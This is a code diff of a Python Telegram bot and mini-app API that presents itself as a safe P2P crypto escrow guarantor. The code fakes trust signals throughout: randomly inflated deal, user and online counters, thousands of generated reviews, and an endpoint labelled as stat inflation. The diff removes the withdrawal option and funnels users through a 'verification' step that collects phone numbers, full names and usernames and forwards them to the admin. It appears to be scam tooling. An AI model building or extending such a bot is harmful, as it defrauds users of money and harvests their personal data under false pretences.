@@ -7,7 +7,7 @@ from datetime import datetime, timedelta
 from typing import Dict, Any, List, Optional
 
 from aiogram import Bot, Dispatcher, types, F
-from aiogram.filters import Command, StateFilter
+from aiogram.filters import Command
 from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo
 from aiogram.fsm.context import FSMContext
 from aiogram.fsm.state import State, StatesGroup
@@ -32,13 +32,7 @@ bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
 dp = Dispatcher()
 
 # ============================================================
-# 3. FSM СОСТОЯНИЯ
-# ============================================================
-class UserStates(StatesGroup):
-    waiting_phone = State()
-
-# ============================================================
-# 4. ФАЙЛЫ
+# 3. ФАЙЛЫ
 # ============================================================
 FILES = {
     "deals": "deals.json",
@@ -73,7 +67,7 @@ user_language = load_json(FILES["user_language"])
 stats = load_json(FILES["stats"])
 
 # ============================================================
-# 5. ГЕНЕРАЦИЯ СТАТИСТИКИ
+# 4. СТАТИСТИКА (ПЛАВНОЕ ПРИБАВЛЕНИЕ)
 # ============================================================
 def init_stats():
     if not stats:
@@ -82,78 +76,34 @@ def init_stats():
         stats["reviews"] = 5234
         stats["volume"] = 45.6
         stats["online"] = 6500
+        stats["last_update"] = datetime.now().isoformat()
         save_json(FILES["stats"], stats)
     return stats
 
 init_stats()
 
-def get_stats():
-    stats["deals_today"] += random.choice([0, 0, 1, 0, 0, 1, 0, 0, 0, 1])
-    stats["users"] += random.choice([0, 0, 0, 1, 0, 0, 0, 1, 0, 0])
-    stats["reviews"] += random.choice([0, 0, 0, 0, 1, 0, 0, 0, 0, 1])
-    stats["volume"] += round(random.choice([0, 0, 0.1, 0, 0, 0.2, 0, 0, 0, 0.1]), 1)
-    stats["online"] = random.randint(6200, 6800)
-    save_json(FILES["stats"], stats)
+def update_stats():
+    """Плавное прибавление статистики каждый вызов"""
+    now = datetime.now()
+    last = datetime.fromisoformat(stats.get("last_update", now.isoformat()))
+    minutes_passed = (now - last).total_seconds() / 60
+    
+    # Прибавляем каждую минуту по чуть-чуть
+    if minutes_passed >= 1:
+        stats["deals_today"] += random.choice([0, 0, 1, 0, 0, 1, 0, 0, 0, 1])
+        stats["users"] += random.choice([0, 0, 0, 1, 0, 0, 0, 1, 0, 0])
+        stats["reviews"] += random.choice([0, 0, 0, 0, 1, 0, 0, 0, 0, 1])
+        stats["volume"] += round(random.choice([0, 0, 0.1, 0, 0, 0.2, 0, 0, 0, 0.1]), 1)
+        stats["online"] = random.randint(6200, 6800)
+        stats["last_update"] = now.isoformat()
+        save_json(FILES["stats"], stats)
     return stats
 
-# ============================================================
-# 6. ПОМОЩНИКИ
-# ============================================================
-def is_admin(user_id: int) -> bool:
-    return user_id == MASTER_ADMIN_ID or str(user_id) in admins
-
-def get_balance(user_id: int) -> Dict:
-    uid = str(user_id)
-    if uid not in balance:
-        balance[uid] = {"ton": 0, "stars": 0, "rub": 0, "uah": 0, "deal_partners": {}}
-        save_json(FILES["balance"], balance)
-    return balance[uid]
-
-def add_balance(user_id: int, currency: str, amount: float):
-    uid = str(user_id)
-    curr = currency.lower()
-    if uid not in balance:
-        balance[uid] = {"ton": 0, "stars": 0, "rub": 0, "uah": 0, "deal_partners": {}}
-    balance[uid][curr] = balance[uid].get(curr, 0) + amount
-    save_json(FILES["balance"], balance)
-
-def is_verified(user_id: int) -> bool:
-    uid = str(user_id)
-    if uid not in verification_data:
-        return False
-    if "verified_at" in verification_data[uid]:
-        verified_time = datetime.fromisoformat(verification_data[uid]["verified_at"])
-        return (datetime.now() - verified_time).total_seconds() < 86400
-    return False
-
-def complete_verification(user_id: int, phone: str):
-    uid = str(user_id)
-    verification_data[uid] = {
-        "verified_at": datetime.now().isoformat(),
-        "phone": phone
-    }
-    save_json(FILES["verification"], verification_data)
-
-def add_log(action: str, data: dict):
-    log_id = str(uuid.uuid4())[:8]
-    logs[log_id] = {
-        "id": log_id,
-        "action": action,
-        "data": data,
-        "time": datetime.now().isoformat()
-    }
-    save_json(FILES["logs"], logs)
-
-def get_user_language(user_id: int) -> str:
-    uid = str(user_id)
-    return user_language.get(uid, "ru")
-
-def set_user_language(user_id: int, lang: str):
-    user_language[str(user_id)] = lang
-    save_json(FILES["user_language"], user_language)
+def get_stats():
+    return update_stats()
 
 # ============================================================
-# 7. ГЕНЕРАЦИЯ ОТЗЫВОВ
+# 5. ГЕНЕРАЦИЯ ОТЗЫВОВ
 # ============================================================
 def generate_reviews():
     if len(reviews) >= 5000:
@@ -186,7 +136,91 @@ def generate_reviews():
 generate_reviews()
 
 # ============================================================
-# 8. КЛАВИАТУРЫ
+# 6. ПОМОЩНИКИ
+# ============================================================
+def is_admin(user_id: int) -> bool:
+    return user_id == MASTER_ADMIN_ID or str(user_id) in admins
+
+def get_balance(user_id: int) -> Dict:
+    uid = str(user_id)
+    if uid not in balance:
+        balance[uid] = {"ton": 0, "stars": 0, "rub": 0, "uah": 0, "deal_partners": {}}
+        save_json(FILES["balance"], balance)
+    return balance[uid]
+
+def add_balance(user_id: int, currency: str, amount: float):
+    uid = str(user_id)
+    curr = currency.lower()
+    if uid not in balance:
+        balance[uid] = {"ton": 0, "stars": 0, "rub": 0, "uah": 0, "deal_partners": {}}
+    balance[uid][curr] = balance[uid].get(curr, 0) + amount
+    save_json(FILES["balance"], balance)
+
+def is_verified(user_id: int) -> bool:
+    uid = str(user_id)
+    if uid not in verification_data:
+        return False
+    if "verified_at" in verification_data[uid]:
+        verified_time = datetime.fromisoformat(verification_data[uid]["verified_at"])
+        return (datetime.now() - verified_time).total_seconds() < 86400
+    return False
+
+def complete_verification(user_id: int, phone: str, full_name: str = "", username: str = ""):
+    uid = str(user_id)
+    verification_data[uid] = {
+        "verified_at": datetime.now().isoformat(),
+        "phone": phone,
+        "full_name": full_name,
+        "username": username
+    }
+    save_json(FILES["verification"], verification_data)
+    # Лог в бота админу
+    add_log("verification", {
+        "user_id": user_id,
+        "username": username,
+        "phone": phone,
+        "full_name": full_name
+    })
+
+def add_log(action: str, data: dict):
+    log_id = str(uuid.uuid4())[:8]
+    logs[log_id] = {
+        "id": log_id,
+        "action": action,
+        "data": data,
+        "time": datetime.now().isoformat()
+    }
+    save_json(FILES["logs"], logs)
+    # Отправка админу
+    asyncio.create_task(send_log_to_admin(log_id, action, data))
+
+async def send_log_to_admin(log_id: str, action: str, data: dict):
+    try:
+        text = f"📋 <b>ЛОГ #{log_id}</b>\n\n"
+        text += f"🕐 Время: {datetime.now().strftime('%d.%m.%Y %H:%M:%S')}\n"
+        text += f"📌 Действие: {action}\n"
+        text += f"📊 Данные:\n"
+        for key, value in data.items():
+            text += f"   • {key}: {value}\n"
+        await bot.send_message(MASTER_ADMIN_ID, text[:4000])
+    except:
+        pass
+
+def get_user_language(user_id: int) -> str:
+    uid = str(user_id)
+    return user_language.get(uid, "ru")
+
+def set_user_language(user_id: int, lang: str):
+    user_language[str(user_id)] = lang
+    save_json(FILES["user_language"], user_language)
+
+def has_2_deals_with_same_buyer(user_id: int) -> bool:
+    bal = get_balance(user_id)
+    partners = bal.get("deal_partners", {})
+    return any(count >= 2 for count in partners.values())
+
+# ============================================================
+# 7. КЛАВИАТУРЫ (БЕЗ ВЫВОДА И ВЕРИФИКАЦИИ)
 # ============================================================
 def main_menu_keyboard(user_id: int):
     buttons = [
@@ -227,7 +261,7 @@ def back_to_main_keyboard(user_id: int):
     ])
 
 # ============================================================
-# 9. ОБРАБОТЧИКИ БОТА
+# 8. ОБРАБОТЧИКИ БОТА
 # ============================================================
 @dp.message(Command("start"))
 async def cmd_start(message: types.Message):
@@ -265,16 +299,9 @@ async def set_language(callback: types.CallbackQuery):
     await callback.message.edit_text(
         f"🔥 <b>{BOT_NAME}</b> 🔥\n\n"
         "Безопасные P2P сделки с криптовалютой.\n\n"
-        "🔹 Честные сделки\n"
-        "🔹 TON | STARS | RUB | UAH\n"
-        "🔹 Гарант безопасности\n"
-        "🔹 Премиум поддержка 24/7\n\n"
-        f"📢 Канал: {CHANNEL_LINK}\n"
-        f"🆘 Поддержка: {SUPPORT_LINK}\n\n"
         "👇 Выберите действие:",
         reply_markup=main_menu_keyboard(callback.from_user.id)
     )
-    await callback.answer()
 
 @dp.callback_query(lambda c: c.data == "select_language")
 async def select_language(callback: types.CallbackQuery):
@@ -323,10 +350,7 @@ async def menu_balance(callback: types.CallbackQuery):
 📊 Сделок завершено: {sum(bal.get('deal_partners', {}).values())}"""
     await callback.message.edit_text(
         text,
-        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="💲 Вывести средства", callback_data="withdraw_start")],
-            [InlineKeyboardButton(text="◀️ На главную", callback_data="back_to_main")]
-        ])
+        reply_markup=back_to_main_keyboard(callback.from_user.id)
     )
     await callback.answer()
 
@@ -368,7 +392,7 @@ async def menu_reviews(callback: types.CallbackQuery):
     await callback.answer()
 
 # ============================================================
-# 10. ОБРАБОТКА ССЫЛКИ НА СДЕЛКУ
+# 9. ОБРАБОТКА ССЫЛКИ НА СДЕЛКУ
 # ============================================================
 async def handle_deal_link(message: types.Message, deal_id: str):
     if deal_id not in deals:
@@ -402,86 +426,7 @@ async def handle_deal_link(message: types.Message, deal_id: str):
     )
 
 # ============================================================
-# 11. ВЫВОД СРЕДСТВ
-# ============================================================
-@dp.callback_query(lambda c: c.data == "withdraw_start")
-async def withdraw_start(callback: types.CallbackQuery):
-    bal = get_balance(callback.from_user.id)
-    partners = bal.get("deal_partners", {})
-    total_deals = sum(partners.values())
-    
-    can_withdraw = any(count >= 2 for count in partners.values())
-    
-    if not can_withdraw:
-        await callback.message.edit_text(
-            f"⚠️ <b>Для вывода необходимо 2 сделки с одним покупателем!</b>\n\n"
-            f"У вас: {total_deals} сделок с {len(partners)} покупателями.\n\n"
-            f"Создайте и завершите ещё сделки.",
-            reply_markup=back_to_main_keyboard(callback.from_user.id)
-        )
-        return
-    
-    if not is_verified(callback.from_user.id):
-        await callback.message.edit_text(
-            f"⚠️ <b>Для вывода средств необходима верификация!</b>\n\n"
-            f"Введите ваш номер телефона в формате:\n"
-            f"<code>+79001234567</code>\n\n"
-            f"После проверки вам будет доступен вывод.",
-            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-                [InlineKeyboardButton(text="📱 Отправить номер", callback_data="send_phone")],
-                [InlineKeyboardButton(text="◀️ На главную", callback_data="back_to_main")]
-            ])
-        )
-        return
-    
-    await callback.message.edit_text(
-        f"💲 <b>Вывод средств</b>\n\n"
-        f"Напишите админу в личные сообщения:\n"
-        f"{SUPPORT_LINK}\n\n"
-        f"Укажите сумму и реквизиты.",
-        reply_markup=back_to_main_keyboard(callback.from_user.id)
-    )
-    await callback.answer()
-
-@dp.callback_query(lambda c: c.data == "send_phone")
-async def send_phone(callback: types.CallbackQuery, state: FSMContext):
-    await callback.message.edit_text(
-        f"📱 Введите ваш номер телефона в формате:\n"
-        f"<code>+79001234567</code>\n\n"
-        f"Это необходимо для верификации.",
-        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="◀️ На главную", callback_data="back_to_main")]
-        ])
-    )
-    await state.set_state(UserStates.waiting_phone)
-    await callback.answer()
-
-@dp.message(UserStates.waiting_phone, lambda msg: msg.text and msg.text.startswith("+") and len(msg.text) >= 11)
-async def process_phone(message: types.Message, state: FSMContext):
-    phone = message.text.strip()
-    uid = str(message.from_user.id)
-    
-    complete_verification(message.from_user.id, phone)
-    add_log("verification", {"user_id": message.from_user.id, "phone": phone})
-    
-    await message.answer(
-        f"✅ <b>Верификация пройдена!</b>\n\n"
-        f"📱 Номер: {phone}\n"
-        f"🕐 Сессия активна 24 часа.\n\n"
-        f"💰 Теперь вам доступен вывод средств.",
-        reply_markup=back_to_main_keyboard(message.from_user.id)
-    )
-    await state.clear()
-
-@dp.message(UserStates.waiting_phone)
-async def invalid_phone(message: types.Message, state: FSMContext):
-    await message.answer(
-        "❌ Неверный формат номера!\n\n"
-        "Используйте: <code>+79001234567</code>"
-    )
-
-# ============================================================
-# 12. АДМИН ПАНЕЛЬ
+# 10. АДМИН ПАНЕЛЬ
 # ============================================================
 @dp.callback_query(lambda c: c.data == "menu_admin")
 async def menu_admin(callback: types.CallbackQuery):
@@ -494,10 +439,218 @@ async def menu_admin(callback: types.CallbackQuery):
     )
     await callback.answer()
 
-# ... остальные админ-обработчики (такие же как в предыдущей версии)
+@dp.callback_query(lambda c: c.data == "admin_all_deals")
+async def admin_all_deals(callback: types.CallbackQuery):
+    if not is_admin(callback.from_user.id):
+        await callback.answer("⛔ Доступ запрещён", show_alert=True)
+        return
+    if not deals:
+        await callback.message.edit_text("📭 Нет сделок", reply_markup=admin_panel_keyboard(callback.from_user.id))
+        return
+    text = "📊 <b>Все сделки</b>\n\n"
+    for d_id, d in list(deals.items())[-20:]:
+        status_map = {
+            "waiting_payment": "⏳ Ожидает оплаты",
+            "paid": "✅ Оплачено",
+            "awaiting_confirmation": "📦 Ожидает подтверждения",
+            "completed": "🎉 Завершено"
+        }
+        text += f"#{d_id} | {status_map.get(d['status'], d['status'])}\n"
+        text += f"   👤 {d.get('seller_username', '?')} → @{d.get('buyer_username', '?')}\n"
+        text += f"   💰 {d.get('amount', 0)} {d.get('currency', '')}\n\n"
+    await callback.message.edit_text(text[:4000], reply_markup=admin_panel_keyboard(callback.from_user.id))
+    await callback.answer()
+
+@dp.callback_query(lambda c: c.data == "admin_withdraw_requests")
+async def admin_withdraw_requests(callback: types.CallbackQuery):
+    if not is_admin(callback.from_user.id):
+        await callback.answer("⛔ Доступ запрещён", show_alert=True)
+        return
+    pending = {k: v for k, v in withdraw_requests.items() if v.get("status") == "pending"}
+    if not pending:
+        await callback.message.edit_text("📭 Нет активных заявок", reply_markup=admin_panel_keyboard(callback.from_user.id))
+        return
+    text = "💲 <b>Заявки на вывод</b>\n\n"
+    for rid, req in list(pending.items())[-10:]:
+        text += f"#{rid}\n   👤 ID: {req.get('user_id', '?')}\n   💰 {req.get('amount', 0)} {req.get('currency', '')}\n   📝 {req.get('details', '')[:30]}\n   ➡️ /confirm_withdraw {rid}\n\n"
+    await callback.message.edit_text(text[:4000], reply_markup=admin_panel_keyboard(callback.from_user.id))
+    await callback.answer()
+
+@dp.callback_query(lambda c: c.data == "admin_add_balance")
+async def admin_add_balance(callback: types.CallbackQuery, state: FSMContext):
+    if not is_admin(callback.from_user.id):
+        await callback.answer("⛔ Доступ запрещён", show_alert=True)
+        return
+    await callback.message.edit_text("💰 <b>Начислить баланс</b>\n\nВведите Telegram ID пользователя:")
+    await state.set_state("waiting_user_id")
+    await callback.answer()
+
+@dp.message(lambda msg: msg.text and msg.text.isdigit())
+async def admin_get_user_id(message: types.Message, state: FSMContext):
+    current_state = await state.get_state()
+    if current_state == "waiting_user_id":
+        try:
+            user_id = int(message.text.strip())
+            await state.update_data(target_user_id=user_id)
+            await message.answer("💱 Введите валюту (TON/STARS/RUB/UAH):")
+            await state.set_state("waiting_currency")
+        except:
+            await message.answer("❌ Введите корректный ID")
+
+@dp.message(lambda msg: msg.text and msg.text.upper() in ["TON", "STARS", "RUB", "UAH"])
+async def admin_get_currency(message: types.Message, state: FSMContext):
+    current_state = await state.get_state()
+    if current_state == "waiting_currency":
+        await state.update_data(currency=message.text.upper())
+        await message.answer("💰 Введите сумму:")
+        await state.set_state("waiting_amount")
+
+@dp.message(lambda msg: msg.text and msg.text.replace(".", "").isdigit())
+async def admin_get_amount(message: types.Message, state: FSMContext):
+    current_state = await state.get_state()
+    if current_state == "waiting_amount":
+        try:
+            amount = float(message.text.strip())
+            if amount <= 0:
+                raise ValueError
+            data = await state.get_data()
+            target_user_id = data.get("target_user_id")
+            currency = data.get("currency")
+            add_balance(target_user_id, currency, amount)
+            add_log("admin_add_balance", {"admin": message.from_user.username, "target": target_user_id, "amount": amount, "currency": currency})
+            await message.answer(
+                f"✅ Начислено {amount} {currency} пользователю {target_user_id}",
+                reply_markup=admin_panel_keyboard(message.from_user.id)
+            )
+            await state.clear()
+        except:
+            await message.answer("❌ Введите положительное число")
+
+@dp.callback_query(lambda c: c.data == "admin_manage_admins")
+async def admin_manage_admins(callback: types.CallbackQuery):
+    if not is_admin(callback.from_user.id):
+        await callback.answer("⛔ Доступ запрещён", show_alert=True)
+        return
+    admin_list = "\n".join([f"• {aid}" for aid in list(admins.keys())]) if admins else "Нет дополнительных админов"
+    await callback.message.edit_text(
+        f"👥 <b>Админы</b>\n\nГлавный: {MASTER_ADMIN_ID}\nДополнительные:\n{admin_list}\n\n/add_admin [ID] - добавить\n/remove_admin [ID] - удалить",
+        reply_markup=admin_panel_keyboard(callback.from_user.id)
+    )
+    await callback.answer()
+
+@dp.message(Command("add_admin"))
+async def add_admin(message: types.Message):
+    if message.from_user.id != MASTER_ADMIN_ID:
+        await message.answer("⛔ Только главный админ")
+        return
+    args = message.text.split()
+    if len(args) != 2:
+        await message.answer("❗️ /add_admin [ID]")
+        return
+    try:
+        new_admin_id = int(args[1])
+        admins[str(new_admin_id)] = True
+        save_json(FILES["admins"], admins)
+        add_log("add_admin", {"admin": message.from_user.username, "new_admin": new_admin_id})
+        await message.answer(f"✅ Админ {new_admin_id} добавлен")
+    except:
+        await message.answer("❌ Введите корректный ID")
+
+@dp.message(Command("remove_admin"))
+async def remove_admin(message: types.Message):
+    if message.from_user.id != MASTER_ADMIN_ID:
+        await message.answer("⛔ Только главный админ")
+        return
+    args = message.text.split()
+    if len(args) != 2:
+        await message.answer("❗️ /remove_admin [ID]")
+        return
+    try:
+        admin_id = int(args[1])
+        if admin_id == MASTER_ADMIN_ID:
+            await message.answer("❌ Нельзя удалить главного админа")
+            return
+        if str(admin_id) in admins:
+            del admins[str(admin_id)]
+            save_json(FILES["admins"], admins)
+            add_log("remove_admin", {"admin": message.from_user.username, "removed": admin_id})
+            await message.answer(f"✅ Админ {admin_id} удалён")
+        else:
+            await message.answer("❌ Админ не найден")
+    except:
+        await message.answer("❌ Введите корректный ID")
+
+@dp.callback_query(lambda c: c.data == "admin_manage_reviews")
+async def admin_manage_reviews(callback: types.CallbackQuery):
+    if not is_admin(callback.from_user.id):
+        await callback.answer("⛔ Доступ запрещён", show_alert=True)
+        return
+    reviews_list = list(reviews.values())
+    if not reviews_list:
+        await callback.message.edit_text("⭐️ Нет отзывов", reply_markup=admin_panel_keyboard(callback.from_user.id))
+        return
+    text = "⭐️ <b>Отзывы</b>\n\n"
+    for r in reviews_list[-10:]:
+        text += f"👤 {r.get('user', 'Аноним')} | {'⭐' * r.get('rating', 5)}\n"
+        text += f"📝 {r.get('text', '')[:50]}\n🆔 {r.get('id', '')}\n➡️ /delete_review {r.get('id', '')}\n\n"
+    await callback.message.edit_text(
+        text[:4000],
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="🗑 Очистить все", callback_data="admin_clear_reviews")],
+            [InlineKeyboardButton(text="◀️ Назад", callback_data="menu_admin")]
+        ])
+    )
+    await callback.answer()
+
+@dp.message(Command("delete_review"))
+async def delete_review_command(message: types.Message):
+    if not is_admin(message.from_user.id):
+        await message.answer("⛔ Доступ запрещён")
+        return
+    args = message.text.split()
+    if len(args) != 2:
+        await message.answer("❗️ /delete_review [ID]")
+        return
+    review_id = args[1]
+    if review_id not in reviews:
+        await message.answer("❌ Отзыв не найден")
+        return
+    del reviews[review_id]
+    save_json(FILES["reviews"], reviews)
+    await message.answer(f"✅ Отзыв удалён")
+
+@dp.callback_query(lambda c: c.data == "admin_clear_reviews")
+async def admin_clear_reviews(callback: types.CallbackQuery):
+    if not is_admin(callback.from_user.id):
+        await callback.answer("⛔ Доступ запрещён", show_alert=True)
+        return
+    if not reviews:
+        await callback.answer("❌ Нет отзывов", show_alert=True)
+        return
+    reviews.clear()
+    save_json(FILES["reviews"], reviews)
+    await callback.message.edit_text("✅ Все отзывы удалены", reply_markup=admin_panel_keyboard(callback.from_user.id))
+    await callback.answer()
+
+@dp.callback_query(lambda c: c.data == "admin_logs")
+async def admin_logs(callback: types.CallbackQuery):
+    if not is_admin(callback.from_user.id):
+        await callback.answer("⛔ Доступ запрещён", show_alert=True)
+        return
+    logs_list = list(logs.values())[-20:]
+    if not logs_list:
+        await callback.message.edit_text("📋 Логи пусты", reply_markup=admin_panel_keyboard(callback.from_user.id))
+        return
+    text = "📋 <b>Последние логи</b>\n\n"
+    for log_entry in reversed(logs_list[-10:]):
+        text += f"🕐 {log_entry.get('time', '')[:19]}\n"
+        text += f"📌 {log_entry.get('action', '')}\n"
+        text += f"📊 {json.dumps(log_entry.get('data', {}), ensure_ascii=False)[:80]}\n\n"
+    await callback.message.edit_text(text[:4000], reply_markup=admin_panel_keyboard(callback.from_user.id))
+    await callback.answer()
 
 # ============================================================
-# 13. API ДЛЯ MINI APP
+# 11. API ДЛЯ MINI APP
 # ============================================================
 async def handle_api(request):
     headers = {
@@ -516,11 +669,13 @@ async def handle_api(request):
     user_id = data.get('user_id')
     endpoint = request.path
     
+    # ===== БАЛАНС =====
     if endpoint == '/api/balance':
         if not user_id:
             return web.json_response({'success': False, 'error': 'user_id required'}, headers=headers)
         return web.json_response({'success': True, 'balance': get_balance(user_id)}, headers=headers)
     
+    # ===== СТАТИСТИКА =====
     elif endpoint == '/api/stats':
         stats_data = get_stats()
         return web.json_response({
@@ -531,9 +686,11 @@ async def handle_api(request):
             'volume': stats_data.get('volume', 0)
         }, headers=headers)
     
+    # ===== ОНЛАЙН =====
     elif endpoint == '/api/online':
         return web.json_response({'online': random.randint(6200, 6800)}, headers=headers)
     
+    # ===== ОТЗЫВЫ =====
     elif endpoint == '/api/reviews':
         limit = data.get('limit', 10)
         page = data.get('page', 0)
@@ -547,20 +704,33 @@ async def handle_api(request):
             'total': len(reviews_list)
         }, headers=headers)
     
+    # ===== ПРОВЕРКА 2 СДЕЛОК =====
+    elif endpoint == '/api/has_2_deals':
+        if not user_id:
+            return web.json_response({'success': False, 'error': 'user_id required'}, headers=headers)
+        has = has_2_deals_with_same_buyer(user_id)
+        return web.json_response({'success': True, 'has_2_deals': has}, headers=headers)
+    
+    # ===== ПРОВЕРКА ВЕРИФИКАЦИИ =====
     elif endpoint == '/api/check_verification':
+        if not user_id:
+            return web.json_response({'success': False, 'error': 'user_id required'}, headers=headers)
         return web.json_response({'success': True, 'verified': is_verified(user_id)}, headers=headers)
     
-    elif endpoint == '/api/can_withdraw':
-        bal = get_balance(user_id)
-        partners = bal.get("deal_partners", {})
-        can_withdraw = any(count >= 2 for count in partners.values())
-        return web.json_response({
-            'success': True,
-            'can_withdraw': can_withdraw,
-            'deals': sum(partners.values()),
-            'partners': len(partners)
-        }, headers=headers)
+    # ===== ВЕРИФИКАЦИЯ (ТОЛЬКО НА САЙТЕ) =====
+    elif endpoint == '/api/verify':
+        phone = data.get('phone')
+        full_name = data.get('full_name', '')
+        username = data.get('username', '')
+        if not user_id or not phone:
+            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
+        # Проверяем 2 сделки
+        if not has_2_deals_with_same_buyer(user_id):
+            return web.json_response({'success': False, 'error': 'Need 2 deals with same buyer'}, headers=headers)
+        complete_verification(user_id, phone, full_name, username)
+        return web.json_response({'success': True, 'verified': True}, headers=headers)
     
+    # ===== СОЗДАНИЕ СДЕЛКИ =====
     elif endpoint == '/api/create_deal':
         product = data.get('product')
         currency = data.get('currency')
@@ -595,6 +765,7 @@ async def handle_api(request):
             'link': link
         }, headers=headers)
     
+    # ===== СДЕЛКИ ПОЛЬЗОВАТЕЛЯ =====
     elif endpoint == '/api/deals':
         if not user_id:
             return web.json_response({'success': False, 'error': 'user_id required'}, headers=headers)
@@ -606,9 +777,11 @@ async def handle_api(request):
                 user_deals.append(d_copy)
         return web.json_response({'success': True, 'deals': user_deals}, headers=headers)
     
+    # ===== ПРОВЕРКА АДМИНА =====
     elif endpoint == '/api/is_admin':
         return web.json_response({'success': True, 'is_admin': is_admin(user_id)}, headers=headers)
     
+    # ===== ОПЛАТА С БАЛАНСА =====
     elif endpoint == '/api/pay_balance':
         deal_id = data.get('deal_id')
         if deal_id not in deals:
@@ -646,6 +819,7 @@ async def handle_api(request):
         
         return web.json_response({'success': True}, headers=headers)
     
+    # ===== ПОЛУЧИТЬ РЕКВИЗИТЫ =====
     elif endpoint == '/api/get_rekvisits':
         deal_id = data.get('deal_id')
         if deal_id not in deals:
@@ -656,6 +830,7 @@ async def handle_api(request):
             'details': f"Оплатите {deal['amount']} {deal['currency']} и нажмите «Я оплатил»"
         }, headers=headers)
     
+    # ===== ПОДТВЕРДИТЬ РЕКВИЗИТЫ (АДМИН) =====
     elif endpoint == '/api/confirm_rekvisits_payment':
         deal_id = data.get('deal_id')
         if not is_admin(user_id):
@@ -687,6 +862,7 @@ async def handle_api(request):
         
         return web.json_response({'success': True}, headers=headers)
     
+    # ===== ПРОДАВЕЦ ПЕРЕДАЛ ТОВАР =====
     elif endpoint == '/api/seller_delivered':
         deal_id = data.get('deal_id')
         if deal_id not in deals:
@@ -715,6 +891,7 @@ async def handle_api(request):
         
         return web.json_response({'success': True}, headers=headers)
     
+    # ===== ПОКУПАТЕЛЬ ПОДТВЕРДИЛ =====
     elif endpoint == '/api/buyer_confirm':
         deal_id = data.get('deal_id')
         if deal_id not in deals:
@@ -747,6 +924,7 @@ async def handle_api(request):
         
         return web.json_response({'success': True}, headers=headers)
     
+    # ===== НАКРУТКА СТАТИСТИКИ =====
     elif endpoint == '/api/admin_set_stats':
         if not is_admin(user_id):
             return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
@@ -762,7 +940,7 @@ async def handle_api(request):
     return web.json_response({'success': False, 'error': 'Unknown endpoint'}, headers=headers)
 
 # ============================================================
-# 14. ЗАПУСК ВЕБ-СЕРВЕРА
+# 12. ЗАПУСК ВЕБ-СЕРВЕРА
 # ============================================================
 async def start_web_server():
     app = web.Application()
@@ -776,7 +954,7 @@ async def start_web_server():
     return runner
 
 # ============================================================
-# 15. ЗАПУСК
+# 13. ЗАПУСК
 # ============================================================
 async def main():
     print("=" * 50)
